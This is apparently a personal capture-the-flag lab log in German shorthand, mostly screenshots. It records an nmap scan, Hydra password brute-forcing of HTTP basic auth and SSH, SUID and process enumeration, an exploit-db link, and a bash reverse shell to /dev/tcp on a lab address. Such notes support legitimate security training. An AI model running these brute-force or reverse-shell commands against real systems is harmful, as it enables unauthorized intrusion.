---
tags: []
---
`nmap 192.168.56.0/24`
mit allen ports
-T4 damit keine firewallfaxen
![[bilder/Pasted image 20250117175643.png]]
![[bilder/Pasted image 20250117175813.png]]
![[bilder/Pasted image 20250117175921.png]]
![[bilder/Pasted image 20250117180005.png]]
![[bilder/Pasted image 20250117180023.png]]
![[bilder/Pasted image 20250117180037.png]]
![[bilder/Pasted image 20250117180113.png]]
![[bilder/Pasted image 20250117180209.png]]
![[bilder/Pasted image 20250117180747.png]]
![[bilder/Pasted image 20250117180729.png]]
![[bilder/Pasted image 20250117181656.png]]
python file für proof zeigen
github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
https://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
`hydra -l user -P pw.txt -s 55487 -f 192.168.15.3 http-get /`
![[bilder/Pasted image 20250117182116.png]]
![[bilder/Pasted image 20250117182208.png]]
`FLAG{use_secure_credentials}`
![[bilder/Pasted image 20250117183032.png]]
![[bilder/Pasted image 20250117183014.png]]
![[bilder/Pasted image 20250117183153.png]]
![[bilder/Pasted image 20250117183736.png]]
`ls -R *`
![[bilder/Pasted image 20250117190434.png]]
![[bilder/Pasted image 20250117191517.png]]
![[bilder/Pasted image 20250117191545.png]]
`hydra -l GrumpyCat -P pw.txt 192.168.15.3 ssh -t 4`
`find -perm -4000 2> /dev/null`
![[bilder/Pasted image 20250117195129.png]]
`cat /proc/741/cmdline`
`find -name "ctf_server.py" 2> /dev/null`
https://superuser.com/questions/632979/if-i-know-the-pid-number-of-a-process-how-can-i-get-its-name
![[bilder/Pasted image 20250117202527.png]]
https://medium.com/techiepedia/series-of-ctf-machines-walkthrough-4-linux-privilege-escalation-enumeration-247899027be
`ls -R * 2>dev/null| grep -i flag`
`cat /usr/local/bin/flag_process.sh`
![[bilder/Pasted image 20250117204436.png]]
![[bilder/Pasted image 20250117211103.png]]
![[bilder/Pasted image 20250117211250.png]]
![[bilder/Pasted image 20250117211407.png]]
![[bilder/Pasted image 20250117211426.png]]
https://www.exploit-db.com/exploits/42274


https://www.puckiestyle.nl/upgrading-netcat-shells-to-meterpreter-sessions/
`bash -i> /dev/tcp/192.168.15.4/6969 0>&1`
![[bilder/Pasted image 20250117234351.png]]
![[bilder/Pasted image 20250117234356.png]]
![[bilder/Pasted image 20250117234535.png]]

suid thing
```bash
find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
```

